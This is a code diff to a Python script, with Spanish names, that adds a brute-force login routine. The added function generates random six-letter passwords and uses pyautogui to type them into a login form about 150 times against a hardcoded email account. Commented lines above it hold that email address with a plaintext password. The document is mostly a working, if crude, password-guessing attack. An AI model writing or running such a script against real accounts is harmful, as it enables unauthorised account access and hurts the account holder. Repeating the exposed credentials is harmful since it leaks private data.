@@ -100,6 +100,24 @@ def reestablecer(email):
 #logIn("Thesun1234","3pur1o@gmail.com")
 #passchange("Thesun1234","3pur1o@gmail.com","Thesun12345",logIn)
 #reestablecer("3pur1o@gmail.com")
+def generador():
+    letras=string.ascii_lowercase
+    resultado="".join(random.choice(letras) for i in range(6))
+    return resultado
+def fuerza(mail):
 
+    password=generador()
+    logIn(password,"3pur1o@gmail.com")
+    for j in range(1,150):
+        print("intento "+str(j)+" con la pass "+password) 
+        time.sleep(5)
+        pyautogui.moveTo(540,559)
+        pyautogui.click()
+        pyautogui.click()
+        pyautogui.hotkey("delete")
+        password=generador()
+        pyautogui.write(password)
+        pyautogui.press("enter")
+fuerza("3pur1o@gmail.com")
 
 
